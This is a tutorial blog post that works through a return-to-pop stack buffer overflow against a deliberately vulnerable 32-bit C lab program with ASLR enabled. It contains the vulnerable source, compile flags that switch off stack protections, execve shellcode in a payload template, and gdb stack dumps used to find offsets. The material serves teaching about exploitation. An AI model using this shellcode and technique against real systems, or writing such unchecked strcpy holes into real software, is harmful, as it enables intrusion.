---
layout:       post
title:        "Defeating ASLR: The RET2POP Method"
category:     "Computing Systems"
tags:         system-security, ASLR
permalink:    /seed-buffer-overflow/
---

In this post, I would like to launch an attack on a 32-bit Ubuntu 20.04 system against a simple userspace program with buffer overflow vulnerability using a stack juggling method called return-to-<code>pop</code>[^1]. The exploitation aims to bypass **Address Space Layout Randomization (ASLR)** (<code>/proc/sys/kernel/randomize_va_space</code> defaults to "<code>2</code>", which means full randomization) and obtain the shell.

<!-- excerpt-end -->

<br />
## Table of Contents
{:.no_toc}
* TOC 
{:toc}
<br />

## The Vulnerable Program

The <code>ans_check.c</code> program uses <code>strcpy()</code> to load the user-specified string to a buffer with 34-byte capacity, and then compares it with "forty-two":

```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int check_answer(char *ans) {

  int ans_flag = 0;
  char ans_buf[34];

  printf("ans_buf is at address %p\n", &ans_buf);

  strcpy(ans_buf, ans);

  if (strcmp(ans_buf, "forty-two") == 0)
    ans_flag = 1;

  return ans_flag;

}

int main(int argc, char *argv[]) {

  if (argc < 2) {
    printf("Usage: %s <answer>\n", argv[0]);
    exit(0);
  }
  if (check_answer(argv[1])) {
    printf("Right answer!\n");
  } else {
    printf("Wrong answer!\n");
  }

  printf("About to exit!\n");
  fflush(stdout);

  /* system("/bin/sh");  // used for NX exploration */
}
```

Compile the program with the following options:

```bash
gcc -g -m32 -no-pie -z execstack -fno-stack-protector ans_check.c -o ans_check
```

It should be noted that we just turned off PIE, NX, and StackGuard protections while leaving ASLR enabled. If we run the program multiple times, we can see different start addresses of <code>ans_buf</code> printed out. To construct an effective exploitation paylod, we need to find a fixed memory address that the program can return to. Fortunately, the <code>main()</code> function meets our need. To see this, use this simple program <code>find_main.c</code>:
```C
#include <stdio.h>
#include <stdlib.h>
int main(int argc, char *argv[])
{
   printf("%p\n", main);
   return 0;
}
```
which gives the start address of <code>main()</code>. Compile it with the command:
```bash
gcc -m32 -no-pie -o find_main find_main.c
```
Execute it several times, we should notice that the address does not change. On my system, the start address of <code>main()</code> is <code>0x08049196</code>.

## The Exploitation Payload

Our payload have three logical components: the first is a sequence of instructions (shellcode), by executing which we can obtain the shell; the second is safe padding with addresses than contain a <code>ret</code> instruction; the third is the address of a <code>pop-ret</code> instruction. In Kotlin's words:

> The purpose of <code>ret</code> will be somewhat similar to a NOP with a tweak, as each <code>ret</code> performs a <code>pop</code> action and increase <code>$esp</code> by four bytes, and then afterward jumps the next one.

If all our handcrafted instructions start at a four-byte aligned memory address, given the fact that strings in C language are <code>NULL</code> terminated, the memory address immediately following our final <code>pop-ret</code> instruction will be contaminated with a "<code>\x00</code>" byte. The <code>pop</code> instruction should be able to eliminate this address from the stack and let the last <code>ret</code> jump to the potential return address which leads to our shellcode. Our ideal payload looks like this:

```bash
./ans_check $(perl -e 'print "\x90"xA, "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80", "{&ret}"xB, "{&pop-ret}"')
```

where the value of <code>B</code> is determined by the offset between the start address of <code>ans_buf</code> and the address we are returning to, and the value of <code>A</code> is chosen to fit a byte-alignment.

## Find the Offset

A pointer to our input string is passed to the function <code>check_answer</code>, which means that the address of our input string is put on the stack before the function <code>check_answer</code> is called. Issuing the command:
```bash
objdump -D ans_check | less
```
we may find three consecutive instructions that push our input string onto the stack, call the function <code>check_answer</code>, and the following instruction which is the return address that will be pushed onto the stack as the call instruction is executed:
```bash
80492f6:       50                      push   %eax
80492f7:       e8 3a ff ff ff          call   8049236 <check_answer>
80492fc:       83 c4 10                add    $0x10,%esp
```

Use the following commands to examine the stack. The breakpoint being set in <code>gdb</code> should be at the call to <code>strcpy()</code>:
```console
gdb -q ans_check6
(gdb) break 12
(gdb) run test
(gdb) x/72xw $esp
```

This is what I got:
```console
gdb-peda$ break 12
Breakpoint 1 at 0x8049269: file ans_check6.c, line 12.
gdb-peda$ run test
Starting program: /home/seed/Documents/return2x/ans_check6 test
ans_buf is at address 0xffffd58a
[----------------------------------registers-----------------------------------]
EAX: 0x21 ('!')
EBX: 0x804c000 --> 0x804bf10 --> 0x1 
ECX: 0x0 
EDX: 0x804a021 --> 0x726f6600 ('')
ESI: 0xf7faa000 --> 0x1e7d6c 
EDI: 0xf7faa000 --> 0x1e7d6c 
EBP: 0xffffd5b8 --> 0xffffd5d8 --> 0x0 
ESP: 0xffffd580 --> 0x0 
EIP: 0x8049269 (<check_answer+51>:      sub    esp,0x8)
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8049260 <check_answer+42>: push   eax
   0x8049261 <check_answer+43>: call   0x80490c0 <printf@plt>
   0x8049266 <check_answer+48>: add    esp,0x10
=> 0x8049269 <check_answer+51>: sub    esp,0x8
   0x804926c <check_answer+54>: push   DWORD PTR [ebp+0x8]
   0x804926f <check_answer+57>: lea    eax,[ebp-0x2e]
   0x8049272 <check_answer+60>: push   eax
   0x8049273 <check_answer+61>: call   0x80490e0 <strcpy@plt>
[------------------------------------stack-------------------------------------]
0000| 0xffffd580 --> 0x0 
0004| 0xffffd584 --> 0x534 
0008| 0xffffd588 --> 0x55 ('U')
0012| 0xffffd58c --> 0xf7fa8224 --> 0xf7f31e90 --> 0xfb1e0ff3 
0016| 0xffffd590 --> 0x0 
0020| 0xffffd594 --> 0xf7faa000 --> 0x1e7d6c 
0024| 0xffffd598 --> 0xf7ffc7e0 --> 0x0 
0028| 0xffffd59c --> 0xf7fad4e8 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, check_answer (ans=0xffffd7f5 "test") at ans_check6.c:12
12        strcpy(ans_buf, ans);
gdb-peda$ x/72xw $esp
0xffffd580:     0x00000000      0x00000534      0x00000055      0xf7fa8224
0xffffd590:     0x00000000      0xf7faa000      0xf7ffc7e0      0xf7fad4e8
0xffffd5a0:     0xf7faa000      0xf7fe22d0      0x00000000      0x00000000
0xffffd5b0:     0xf7faa3fc      0x0804c000      0xffffd5d8      0x080492fc
0xffffd5c0:     0xffffd7f5      0xffffd684      0xffffd690      0x080492bc
0xffffd5d0:     0xffffd5f0      0x00000000      0x00000000      0xf7ddcee5
0xffffd5e0:     0xf7faa000      0xf7faa000      0x00000000      0xf7ddcee5
0xffffd5f0:     0x00000002      0xffffd684      0xffffd690      0xffffd614
0xffffd600:     0xf7faa000      0x00000000      0xffffd668      0x00000000
0xffffd610:     0xf7ffd000      0x00000000      0xf7faa000      0xf7faa000
0xffffd620:     0x00000000      0x8337981a      0xc7013e0a      0x00000000
0xffffd630:     0x00000000      0x00000000      0x00000002      0x08049120
0xffffd640:     0x00000000      0xf7fe7ad4      0xf7fe22d0      0x0804c000
0xffffd650:     0x00000002      0x08049120      0x00000000      0x08049156
0xffffd660:     0x080492a4      0x00000002      0xffffd684      0x08049360
0xffffd670:     0x080493d0      0xf7fe22d0      0xffffd67c      0x0000001c
0xffffd680:     0x00000002      0xffffd7cc      0xffffd7f5      0x00000000
0xffffd690:     0xffffd7fa      0xffffd80a      0xffffd818      0xffffd836
```

There are several addresses we are particularly insterested in:

$$
\texttt{
{0xffffd580:     0x00000000      0x00000534      0x00\textbf{00}0055      0xf7fa8224 \textbf{ans\_buf start address}\\
0xffffd590:     0x00000000      0xf7faa000      0xf7ffc7e0      0xf7fad4e8\\
0xffffd5a0:     0xf7faa000      0xf7fe22d0      0x00000000      0x00000000\\
0xffffd5b0:     0xf7faa3fc      0x0804c000      0xffffd5d8      \textbf{0x080492fc} $\leftarrow$ \textbf{return address for check\_answer}\\
0xffffd5c0:     \textbf{0xffffd7f5}      0xffffd684      0xffffd690      0x080492bc \textbf{first argument of check\_answer}\\
......\\
0xffffd680:     0x00000002      0xffffd7cc      \textbf{0xffffd7f5}      0x00000000 \textbf{higher address of our input string}\\
......\\
0xffffd7f0:     0x366b6365      0x\textbf{736574}00      0x485300\textbf{74}      0x3d4c4c45 \textbf{"test"}
}
$$

We should notice that the offset between the start address of <code>ans_buf</code> and the higher address of our input string "test" (inside the stack frame of <code>main()</code>) is <code>0xffffd688 - 0xffffd58a = 0xfe = 254</code> bytes.

## Notes

[^1]: See [Izik Kotler](ikotler.org), "Smack the Stack (Advanced Buffer Overflow Methods)", In Proceedings of 22C3, 2005.